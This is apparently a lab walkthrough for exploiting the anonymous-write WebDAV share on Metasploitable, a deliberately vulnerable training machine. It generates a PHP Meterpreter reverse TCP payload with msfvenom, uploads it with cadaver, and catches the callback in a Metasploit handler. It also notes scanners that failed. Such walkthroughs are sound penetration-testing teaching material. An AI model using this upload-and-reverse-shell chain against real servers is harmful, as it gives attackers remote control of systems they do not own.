
# Metasploitable/Apache/DAV
Contents [hide]

    1 What Is It?
    2 Command-Line Tools
        2.1 Cadaver
            2.1.1 Connect to Server
            2.1.2 Get a PHP Shell
            2.1.3 Create A Payload
            2.1.4 Houston, We Have A Shell
    3 Tools That Don't Work
        3.1 Davtest
            3.1.1 Scan
            3.1.2 Action Failures
        3.2 Metasploit Modules
            3.2.1 webdav scanner
            3.2.2 webdav internal ip
            3.2.3 webdav website content
    4 Flags

### What Is It?

WebDAV stands for Web Distributed Authoring and Versioning.

The WebDAV protocol provides a framework for users to create, change and move documents on a server, typically a web server or web share.
Command-Line Tools

### Cadaver

Cadaver is a utility for dealing with WebDAV systems on the command line.

Some background here: http://web.cs.sunyit.edu/~yanarej/Labs430/Lab_7__Exploitation.pdf

We'll connect to the remote server using cadaver like cadaver http://10.0.0.27/dav.
Connect to Server

With cadaver, we can connect to the DAV server directly. It turns out this method does not require credentials. Once we type the cadaver command to connect to the server, we're immediately connected:

```
root@morpheus:~# cadaver http://10.0.0.27/dav
dav:/dav/>
```
What this means is, we have access to the WebDAV directory, and we can create files:
```
root@morpheus:~# cadaver http://10.0.0.27/dav
dav:/dav/> put test.txt
Uploading test.txt to `/dav/test.txt':
Progress: [=============================>] 100.0% of 12 bytes succeeded.
dav:/dav/>
```
We can do other things, too:
```
dav:/dav/> ?
Available commands:
 ls         cd         pwd        put        get        mget       mput
 edit       less       mkcol      cat        delete     rmcol      copy
 move       lock       unlock     discover   steal      showlocks  version
 checkin    checkout   uncheckout history    label      propnames  chexec
 propget    propdel    propset    search     set        open       close
 echo       quit       unset      lcd        lls        lpwd       logout
 help       describe   about
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
dav:/dav/>
```

If you want to delete or move files:
```

root@morpheus:~# cadaver http://10.0.0.27/dav
dav:/dav/> delete test.txt
```

## Get a PHP Shell

In this example we'll use Metasploit to obtain a remote shell. We will do this by creating a PHP file that will give us a remote shell using msfvenom, then upload the PHP script via WebDAV.

### Create A Payload

The msfvenom utility can be used to generate a reverse TCP shell in a PHP script. There's some important information contained here: https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit

Basically, here's what you specify with msfvenom:
```

    LHOST - this is the machine that you want your target machine to try and connect to. This must be the publicly-visible (or at least visible to the target) IP of your command-and-control server.
    LPORT - this is the port number that you want the target machine to connect to. The command-and-control server must have this port open, for the target to connect to it.
    ```

In this case, Metasploitable is on the local network, so the command-and-control server's IP address is 10.0.0.25.

root@morpheus:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.25 LPORT=4444 -f raw > meterpreter.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 945 bytes

Now use cadaver to connect and put the PHP shell onto the web server:
```

root@morpheus:~# cadaver http://10.0.0.27/dav
dav:/dav/> put meterpreter.php
Uploading meterpreter.php to `/dav/meterpreter.php':
Progress: [=============================>] 100.0% of 945 bytes succeeded.
dav:/dav/>
```

Two more steps:

First, open msfconsole and wait for a connection from the remote host.
```

msf > use exploit/multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 10.0.0.27
LHOST => 10.0.0.27
msf exploit(handler) > run

[-] Handler failed to bind to 10.0.0.27:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Starting the payload handler...
```

This will wait for the reverse connection from the target machine.

The second and final step is to execute the PHP file. Click the PHP file or visit its url in the browser. This will execute the PHP code, create a shell, and open a connection to your metasploit console.


Houston, We Have A Shell

Now you have a Meterpreter shell.

Time to learn a whole new set of tools!
```

meterpreter > ?

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    set_timeouts              Set the current session timeout values
    use                       Deprecated alias for 'load'
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    portfwd       Forward a local port to a remote service


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getuid        Get the user that the server is running as
    kill          Terminate a process
    ps            List running processes
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS

meterpreter >
```

Tools That Don't Work

While cadaver combined with msfvenom works great for connecting to a WebDAV server and delivering a payload, some tools did not work so great.
Davtest

You can test out DAV using the davtest command line utility.

Also used here: https://www.youtube.com/watch?v=JoV1aSuy1XU&t=21m52s

Check that you've got a copy:
```

# which davtest
```

Scan

You can scan a WebDAV server using the davtest program by specifying the url:
```

root@morpheus:~# davtest -url 10.0.0.27/dav
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		10.0.0.27/dav
********************************************************
NOTE	Random string for this session: HE4bxEUNq5
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	cgi	FAIL
PUT	shtml	FAIL
PUT	cfm	FAIL
PUT	pl	FAIL
PUT	php	FAIL
PUT	html	FAIL
PUT	jsp	FAIL
PUT	asp	FAIL
PUT	txt	FAIL
PUT	aspx	FAIL
PUT	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:

root@morpheus:~#
```

This output is more helpful than the Metasploitable WebDAV scanner - but still doesn't do what cadaver does. It says we can't do any actions. But cadaver was able to do all those things without credentials. (???)
Action Failures

From the davtest scan, we saw a bunch of actions failed. I guess that means we need credentials to do anything. (?)
Metasploit Modules

To check for WebDAV, you can use a couple of different modules:
webdav scanner

Scan for WebDAV:
```

msf auxiliary(webdav_scanner) > run

[*] 10.0.0.27 (Apache/2.2.8 (Ubuntu) DAV/2) WebDAV disabled.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(webdav_scanner) >
```

Looks like it is turned off...
webdav internal ip

we can use another scanner module to check for internal IPs with WebDAV enabled:
```

msf > use auxiliary/scanner/http/webdav_internal_ip
msf auxiliary(webdav_internal_ip) > show options

Module options (auxiliary/scanner/http/webdav_internal_ip):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       Path to use
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf auxiliary(webdav_internal_ip) > set RHOSTS 10.0.0.27
RHOSTS => 10.0.0.27
msf auxiliary(webdav_internal_ip) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(webdav_internal_ip) >
```

webdav website content

Similarly with the next scanner:
```

msf auxiliary(webdav_website_content) > use auxiliary/scanner/http/webdav_website_content
msf auxiliary(webdav_website_content) > show options

Module options (auxiliary/scanner/http/webdav_website_content):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       Path to use
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf auxiliary(webdav_website_content) > set RHOSTS 10.0.0.27
RHOSTS => 10.0.0.27
msf auxiliary(webdav_website_content) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(webdav_website_content) >
```

If you manage to find a writable directory, you can use it to get a remote shell: http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html
